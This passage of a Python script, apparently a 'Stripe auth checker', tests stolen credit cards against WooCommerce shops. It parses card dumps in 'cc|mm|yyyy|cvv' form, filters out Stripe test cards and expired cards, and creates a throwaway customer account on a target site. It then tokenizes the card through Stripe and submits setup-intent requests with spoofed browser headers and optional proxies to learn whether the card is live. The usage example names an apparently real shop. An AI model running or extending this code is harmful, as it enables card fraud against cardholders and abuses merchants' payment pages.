        body_parts.append(self.pm_id)
        body_parts.append(f'------geckoformboundary{boundary_suffix}')
        body_parts.append('Content-Disposition: form-data; name="_ajax_nonce"')
        body_parts.append('')
        body_parts.append(self.create_setup_intent_nonce)
        body_parts.append(f'------geckoformboundary{boundary_suffix}--')
        body_parts.append('')
        
        multipart_body = '\r\n'.join(body_parts)
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': urljoin(self.domain, '/my-account/add-payment-method/'),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Origin': self.domain,
            'Sec-GPC': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=4',
            'User-Agent': self.session.headers['User-Agent'],
        }
        
        self.log(f"POST {url} (Pattern 1)")
        self.log(f"Payment Method ID: {self.pm_id}")
        
        response = self.session.post(url, data=multipart_body, headers=headers, timeout=30)
        return self._parse_setup_intent_response(response)
    
    def step8_create_setup_intent_pattern2(self) -> Tuple[bool, Dict]:
        """Step 8 Pattern 2: Create and confirm setup intent with WooCommerce Stripe Gateway (application/x-www-form-urlencoded)"""
        self.log("Trying Pattern 2: wc_stripe_create_and_confirm_setup_intent (application/x-www-form-urlencoded)")
        
        if not self.create_and_confirm_setup_intent_nonce:
            self.log("Pattern 2 nonce (createAndConfirmSetupIntentNonce) not found!", "ERROR")
            return False, {}
        
        url = urljoin(self.domain, '/wp-admin/admin-ajax.php')
        
        # Prepare URL-encoded form data
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': self.pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': self.create_and_confirm_setup_intent_nonce,
        }
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': self.domain,
            'Connection': 'keep-alive',
            'Referer': urljoin(self.domain, '/my-account/add-payment-method/'),
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': self.session.headers['User-Agent'],
        }
        
        self.log(f"POST {url} (Pattern 2)")
        self.log(f"Payment Method ID: {self.pm_id}")
        
        response = self.session.post(url, data=data, headers=headers, timeout=30)
        return self._parse_setup_intent_response(response)
    
    def step8_create_setup_intent(self) -> Tuple[bool, Dict]:
        """Step 8: Create setup intent with WooCommerce (supports both patterns with fallback)"""
        self.log("=" * 60)
        self.log("Step 8: Creating setup intent")
        self.log("=" * 60)
        
        try:
            if not self.pm_id:
                self.log("Payment method ID not found!", "ERROR")
                return False, {}
            
            # Try Pattern 1 first if we have the nonce or pattern is set to pattern1
            if self.stripe_pattern == 'pattern1' or (self.create_setup_intent_nonce and not self.stripe_pattern == 'pattern2'):
                self.log("Attempting Pattern 1...")
                success, result = self.step8_create_setup_intent_pattern1()
                if success:
                    return True, result
                elif self.stripe_pattern == 'pattern1':
                    # Pattern 1 was explicitly set, don't try pattern 2
                    return False, result
                else:
                    self.log("Pattern 1 failed, trying Pattern 2...", "WARNING")
            
            # Try Pattern 2 if Pattern 1 failed or pattern is set to pattern2
            if self.stripe_pattern == 'pattern2' or self.create_and_confirm_setup_intent_nonce:
                self.log("Attempting Pattern 2...")
                success, result = self.step8_create_setup_intent_pattern2()
                if success:
                    return True, result
                elif self.stripe_pattern == 'pattern2':
                    # Pattern 2 was explicitly set, don't try pattern 1
                    return False, result
                else:
                    self.log("Pattern 2 failed, trying Pattern 1...", "WARNING")
            
            # If we get here and pattern wasn't set, try the other pattern
            if not self.stripe_pattern:
                if self.create_setup_intent_nonce:
                    self.log("Trying Pattern 1 as fallback...")
                    success, result = self.step8_create_setup_intent_pattern1()
                    if success:
                        return True, result
                
                if self.create_and_confirm_setup_intent_nonce:
                    self.log("Trying Pattern 2 as fallback...")
                    success, result = self.step8_create_setup_intent_pattern2()
                    if success:
                        return True, result
            
            # Both patterns failed
            self.log("All patterns failed!", "ERROR")
            return False, {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to create setup intent with both patterns',
                'raw_response': '',
                'status_code': 0
            }
            
        except Exception as e:
            self.log(f"Error creating setup intent: {str(e)}", "ERROR")
            return False, {
                'success': False,
                'status': 'ERROR',
                'message': f'Exception: {str(e)}',
                'error': str(e)
            }
    
    def run(self, cc: str, mm: str, yyyy: str, cvv: str) -> Dict:
        """
        Run the complete flow
        
        Args:
            cc: Credit card number
            mm: Expiry month (2 digits)
            yyyy: Expiry year (4 digits)
            cvv: CVV code
        
        Returns:
            Dict with result information
        """
        self.log("=" * 60)
        self.log("Starting Stripe Auth Checker")
        self.log("=" * 60)
        
        # Step 1: Visit account page
        success, html = self.step1_visit_account_page()
        if not success:
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to visit account page',
                'account_email': None,
                'pm_id': None
            }
        
        # Step 2: Check requirements
        success, requirements = self.step2_check_requirements(html)
        if not success:
            # Only fail if email field is missing (not for captcha)
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Requirements check failed - email field missing',
                'requirements': requirements,
                'account_email': None,
                'pm_id': None
            }
        
        # Step 3: Extract registration nonce
        if not self.step3_extract_register_nonce(html):
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to extract registration nonce',
                'account_email': None,
                'pm_id': None
            }
        
        # Step 4: Create account
        if not self.step4_create_account():
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to create account',
                'account_email': self.account_email,
                'pm_id': None
            }
        
        # Step 5: Load payment method page
        success, html = self.step5_load_payment_method_page()
        if not success:
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to load payment method page',
                'account_email': self.account_email,
                'pm_id': None
            }
        
        # Step 6: Generate Stripe session IDs
        self.step6_generate_stripe_ids()
        
        # Step 7: Tokenize card with Stripe
        if not self.step7_tokenize_card_stripe(cc, mm, yyyy, cvv):
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Failed to tokenize card with Stripe',
                'account_email': self.account_email,
                'pm_id': None
            }
        
        # Step 8: Create setup intent
        success, result = self.step8_create_setup_intent()
        
        self.log("=" * 60)
        self.log("Process completed!")
        self.log("=" * 60)
        
        # Ensure result always has all fields
        if not isinstance(result, dict):
            result = {}
        
        # Add/update result fields
        result['account_email'] = self.account_email
        result['success'] = success
        result['pm_id'] = self.pm_id
        
        # Ensure status and message are always present
        if 'status' not in result:
            result['status'] = 'UNKNOWN' if success else 'FAILED'
        if 'message' not in result or not result.get('message'):
            result['message'] = 'Process completed' if success else 'Process failed'
        
        # Log final result summary
        self.log(f"Final Status: {result.get('status', 'UNKNOWN')}")
        self.log(f"Message: {result.get('message', 'No message')}")
        self.log(f"Account Email: {result.get('account_email', 'N/A')}")
        self.log(f"Payment Method ID: {result.get('pm_id', 'N/A')}")
        
        # If failed, print raw JSON response
        if not success and result.get('raw_response_json'):
            self.log("=" * 60)
            self.log("RAW JSON RESPONSE (FAILED):")
            self.log("=" * 60)
            self.log(json.dumps(result['raw_response_json'], indent=2))
            self.log("=" * 60)
        elif not success and result.get('raw_response'):
            self.log("=" * 60)
            self.log("RAW RESPONSE (FAILED):")
            self.log("=" * 60)
            self.log(result['raw_response'][:1000])
            self.log("=" * 60)
        
        return result


def parse_cc_string(cc_string: str) -> Tuple[str, str, str, str]:
    """
    Parse credit card string in any format and extract cc, mm, yyyy, cvv
    
    Supports formats:
    - cc|mm|yyyy|cvv
    - cc|mm|yy|cvv
    - cc mm yyyy cvv
    - cc/mm/yyyy/cvv
    - Any combination with spaces, pipes, slashes, etc.
    
    Args:
        cc_string: Credit card string in any format (e.g., "4111111111111111|12|2025|123" or "4111111111111111 12 2025 123")
    
    Returns:
        Tuple of (cc, mm, yyyy, cvv)
    
    Raises:
        ValueError: If the string cannot be parsed or doesn't match expected patterns
    """
    # First, try to parse pipe-separated or space-separated format directly
    # This is more reliable than just extracting digits
    if '|' in cc_string:
        parts = [p.strip() for p in cc_string.split('|')]
        if len(parts) == 4:
            cc, mm, year, cvv = parts
            # Extract digits from each part
            cc = ''.join(filter(str.isdigit, cc))
            mm = ''.join(filter(str.isdigit, mm))
            year = ''.join(filter(str.isdigit, year))
            cvv = ''.join(filter(str.isdigit, cvv))
            
            # Validate lengths
            if len(cc) != 16:
                raise ValueError(f"Invalid CC length: {len(cc)} (expected 16)")
            if len(mm) != 2:
                raise ValueError(f"Invalid month length: {len(mm)} (expected 2)")
            if len(cvv) not in [3, 4]:
                raise ValueError(f"Invalid CVV length: {len(cvv)} (expected 3 or 4)")
            
            # Convert year to 4 digits if needed
            if len(year) == 2:
                yy_int = int(year)
                yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
            elif len(year) == 4:
                yyyy = year
            else:
                raise ValueError(f"Invalid year length: {len(year)} (expected 2 or 4)")
            
            # Validate values
            if not (1 <= int(mm) <= 12):
                raise ValueError(f"Invalid month: {mm}")
            if not (2000 <= int(yyyy) <= 2099):
                raise ValueError(f"Invalid year: {yyyy}")
            
            return cc, mm, yyyy, cvv
    elif ' ' in cc_string and cc_string.count(' ') >= 3:
        # Space-separated format
        parts = cc_string.split()
        if len(parts) >= 4:
            cc, mm, year, cvv = parts[0], parts[1], parts[2], parts[3]
            # Extract digits from each part
            cc = ''.join(filter(str.isdigit, cc))
            mm = ''.join(filter(str.isdigit, mm))
            year = ''.join(filter(str.isdigit, year))
            cvv = ''.join(filter(str.isdigit, cvv))
            
            # Validate lengths
            if len(cc) != 16:
                raise ValueError(f"Invalid CC length: {len(cc)} (expected 16)")
            if len(mm) != 2:
                raise ValueError(f"Invalid month length: {len(mm)} (expected 2)")
            if len(cvv) not in [3, 4]:
                raise ValueError(f"Invalid CVV length: {len(cvv)} (expected 3 or 4)")
            
            # Convert year to 4 digits if needed
            if len(year) == 2:
                yy_int = int(year)
                yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
            elif len(year) == 4:
                yyyy = year
            else:
                raise ValueError(f"Invalid year length: {len(year)} (expected 2 or 4)")
            
            # Validate values
            if not (1 <= int(mm) <= 12):
                raise ValueError(f"Invalid month: {mm}")
            if not (2000 <= int(yyyy) <= 2099):
                raise ValueError(f"Invalid year: {yyyy}")
            
            return cc, mm, yyyy, cvv
    
    # Fallback to digit extraction method for other formats
    # Extract only digits
    digits_only = ''.join(filter(str.isdigit, cc_string))
    
    total_digits = len(digits_only)
    
    # Determine pattern based on total length
    # Pattern 1: 16 (cc) + 4 (mm+yy) + 3 (cvv) = 23 digits
    # Pattern 2: 16 (cc) + 6 (mm+yyyy) + 3 (cvv) = 25 digits
    # Pattern 3: 16 (cc) + 4 (mm+yy) + 4 (cvv) = 24 digits
    # Pattern 4: 16 (cc) + 6 (mm+yyyy) + 4 (cvv) = 26 digits
    # Also handle edge cases: 21-22 (might be missing some digits) and 27+ (extra digits)
    
    if total_digits < 21 or total_digits > 26:
        raise ValueError(f"Invalid CC string format. Expected 21-26 digits, got {total_digits} digits: {digits_only}")
    
    # Extract CC (always 16 digits)
    cc = digits_only[:16]
    
    # Determine expiry and CVV based on remaining digits
    # Pattern 1: 16 + 4 (mm+yy) + 3 (cvv) = 23 total, remaining = 7
    # Pattern 2: 16 + 6 (mm+yyyy) + 3 (cvv) = 25 total, remaining = 9
    # Pattern 3: 16 + 4 (mm+yy) + 4 (cvv) = 24 total, remaining = 8
    # Pattern 4: 16 + 6 (mm+yyyy) + 4 (cvv) = 26 total, remaining = 10
    
    remaining = digits_only[16:]
    remaining_len = len(remaining)
    
    # Handle edge cases where we might have 21-22 digits (missing some)
    if remaining_len < 5:
        raise ValueError(f"Too few digits after CC. Expected at least 5 digits (mm+yy+cvv), got {remaining_len}: {remaining}")
    
    if remaining_len == 5:
        # Likely 2 (mm) + 2 (yy) + 3 (cvv) - but missing one digit, try to parse anyway
        mm = remaining[:2]
        yy = remaining[2:4]
        cvv = remaining[4:]
        yy_int = int(yy)
        yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
    elif remaining_len == 6:
        # Could be 2 (mm) + 2 (yy) + 4 (cvv) or 2 (mm) + 4 (yyyy) - try 2+2+4 first
        mm = remaining[:2]
        yy = remaining[2:4]
        cvv = remaining[4:]
        yy_int = int(yy)
        yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
    elif remaining_len == 7:
        # Pattern 1: 4 digits (mm+yy) + 3 digits (cvv)
        expiry = remaining[:4]
        cvv = remaining[4:]
        mm = expiry[:2]
        yy = expiry[2:]
        # Convert 2-digit year to 4-digit (assume 20xx if < 50, else 19xx)
        yy_int = int(yy)
        yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
    elif remaining_len == 8:
        # Pattern 3: 4 digits (mm+yy) + 4 digits (cvv)
        expiry = remaining[:4]
        cvv = remaining[4:]
        mm = expiry[:2]
        yy = expiry[2:]
        # Convert 2-digit year to 4-digit
        yy_int = int(yy)
        yyyy = f"20{yy_int:02d}" if yy_int < 50 else f"19{yy_int:02d}"
    elif remaining_len == 9:
        # Pattern 2: 6 digits (mm+yyyy) + 3 digits (cvv)
        expiry = remaining[:6]
        cvv = remaining[6:]
        mm = expiry[:2]
        yyyy = expiry[2:]
    elif remaining_len == 10:
        # Pattern 4: 6 digits (mm+yyyy) + 4 digits (cvv)
        expiry = remaining[:6]
        cvv = remaining[6:]
        mm = expiry[:2]
        yyyy = expiry[2:]
    else:
        # Should not reach here if all patterns are handled above
        raise ValueError(f"Cannot parse CC string. Unexpected remaining digits length ({remaining_len}): {remaining}")
    
    # Validate extracted values
    if len(cc) != 16:
        raise ValueError(f"Invalid CC length: {len(cc)} (expected 16)")
    if len(mm) != 2 or not (1 <= int(mm) <= 12):
        raise ValueError(f"Invalid month: {mm}")
    if len(yyyy) != 4 or not (2000 <= int(yyyy) <= 2099):
        raise ValueError(f"Invalid year: {yyyy}")
    if len(cvv) not in [3, 4]:
        raise ValueError(f"Invalid CVV length: {len(cvv)} (expected 3 or 4)")
    
    return cc, mm, yyyy, cvv


def validate_luhn(cc_number: str) -> bool:
    """
    Validate credit card number using Luhn algorithm
    
    Args:
        cc_number: Credit card number as string (digits only)
    
    Returns:
        True if valid, False otherwise
    """
    # Remove any non-digit characters
    digits = ''.join(filter(str.isdigit, cc_number))
    
    if len(digits) != 16:
        return False
    
    # Luhn algorithm: double every second digit from right, sum all digits
    # If sum is divisible by 10, card number is valid
    total = 0
    reverse_digits = digits[::-1]
    
    for i, digit in enumerate(reverse_digits):
        num = int(digit)
        if i % 2 == 1:  # Every second digit (from right)
            num *= 2
            if num > 9:
                num -= 9  # Sum of digits for numbers > 9
        total += num
    
    return total % 10 == 0


def is_stripe_rejected_card(cc_number: str) -> bool:
    """
    Check if card number is a known test card pattern that Stripe rejects during tokenization
    
    These cards pass Luhn validation but will fail Stripe tokenization:
    - All same digits: 1111111111111111, 2222222222222222, etc.
    - All 4s: 4242424242424242 (Stripe test card that requires 3D Secure)
    - All 4s pattern: 4111111111111111, 4222222222222222, etc.
    
    Args:
        cc_number: Credit card number as string (digits only)
    
    Returns:
        True if card is likely to be rejected by Stripe, False otherwise
    """
    # Remove any non-digit characters
    digits = ''.join(filter(str.isdigit, cc_number))
    
    if len(digits) != 16:
        return False
    
    # Check if all digits are the same (1111111111111111, 2222222222222222, etc.)
    if len(set(digits)) == 1:
        return True
    
    # Check for known problematic patterns
    problematic_patterns = [
        '4111111111111111',  # All 1s after 4
        '4222222222222222',  # All 2s after 4
        '4242424242424242',  # Stripe test card (requires 3D Secure, will fail)
        '4444444444444444',  # All 4s
    ]
    
    if digits in problematic_patterns:
        return True
    
    # Check for patterns like: 4 followed by same digit repeated
    if digits[0] == '4' and len(set(digits[1:])) == 1:
        return True
    
    return False


def validate_expiry(mm: str, yyyy: str) -> Tuple[bool, Optional[str]]:
    """
    Validate expiry date (check if card is expired)
    
    Args:
        mm: Month as string (01-12)
        yyyy: Year as string (4 digits)
    
    Returns:
        Tuple of (is_valid, error_message)
        - If valid: (True, None)
        - If expired: (False, "Expired card")
    """
    try:
        month = int(mm)
        year = int(yyyy)
        
        # Get current date
        from datetime import datetime
        now = datetime.now()
        current_year = now.year
        current_month = now.month
        
        # Check if expiry is in the past
        if year < current_year:
            return False, "Expired card"
        elif year == current_year and month < current_month:
            return False, "Expired card"
        
        # Check if expiry is too far in the future (more than 20 years)
        if year > current_year + 20:
            return False, "Invalid expiry date"
        
        return True, None
    except (ValueError, TypeError):
        return False, "Invalid expiry date"


def auth(domain: str, cc_string: str, proxy: Optional[str] = None) -> Dict:
    """
    Main function to authenticate and add card to Stripe-powered site
    
    This function can be called from other scripts:
        from stripe_auth_checker import auth
        result = auth("example.com", "4111111111111111|12|2025|123")
    
    Args:
        domain: Domain of the site (e.g., "example.com" or "https://example.com")
        cc_string: Credit card string in any format:
            - "4111111111111111|12|2025|123"
            - "4111111111111111 12 2025 123"
            - "4111111111111111/12/25/123"
            - "4111111111111111|12|25|1234"
            - Any combination with spaces, pipes, slashes, etc.
        proxy: Optional proxy in format "ip:port" or "user:pass@ip:port"
    
    Returns:
        Dict with result information:
        {
            "success": bool,
            "status": str,  # "SUCCESS", "ERROR", "FAILED", etc.
            "message": str,
            "account_email": str,
            "pm_id": str,
            "raw_response": str,
            "raw_response_json": dict,
            "status_code": int
        }
    """
    try:
        # Parse the CC string
        cc, mm, yyyy, cvv = parse_cc_string(cc_string)
        
        # Validate Luhn algorithm (CC number must be divisible by 10)
        if not validate_luhn(cc):
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Incorrect card number',
                'account_email': None,
                'pm_id': None,
                'raw_response': '',
                'raw_response_json': None,
                'status_code': 0
            }
        
        # Check if card is a known pattern that Stripe will reject during tokenization
        if is_stripe_rejected_card(cc):
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Incorrect card number',
                'account_email': None,
                'pm_id': None,
                'raw_response': '',
                'raw_response_json': None,
                'status_code': 0
            }
        
        # Validate expiry date (check if card is expired)
        is_valid_expiry, expiry_error = validate_expiry(mm, yyyy)
        if not is_valid_expiry:
            return {
                'success': False,
                'status': 'ERROR',
                'message': expiry_error or 'Expired card',
                'account_email': None,
                'pm_id': None,
                'raw_response': '',
                'raw_response_json': None,
                'status_code': 0
            }
        
        # Create checker instance
        checker = StripeAuthChecker(domain, proxy)
        
        # Run the authentication flow
        result = checker.run(cc, mm, yyyy, cvv)
        
        return result
        
    except ValueError as e:
        return {
            'success': False,
            'status': 'ERROR',
            'message': f'Invalid CC format: {str(e)}',
            'account_email': None,
            'pm_id': None,
            'raw_response': '',
            'raw_response_json': None,
            'status_code': 0
        }
    except Exception as e:
        return {
            'success': False,
            'status': 'ERROR',
            'message': f'Exception: {str(e)}',
            'account_email': None,
            'pm_id': None,
            'raw_response': '',
            'raw_response_json': None,
            'status_code': 0
        }


def main():
    """Main function for testing"""
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python stripe_auth_checker.py <domain> <cc_string> [proxy]")
        print("Example: python stripe_auth_checker.py alternativesentiments.co.uk 4111111111111111|12|2025|123")
        print("CC string can be in any format: '4111111111111111|12|2025|123' or '4111111111111111 12 2025 123'")
        sys.exit(1)
    
    domain = sys.argv[1]
    cc_string = sys.argv[2]
    proxy = sys.argv[3] if len(sys.argv) > 3 else None
    
    result = auth(domain, cc_string, proxy)
    
    print("\n" + "=" * 60)
    print("FINAL RESULT:")
    print("=" * 60)
    print(json.dumps(result, indent=2))
    print("=" * 60)


if __name__ == "__main__":
    main()
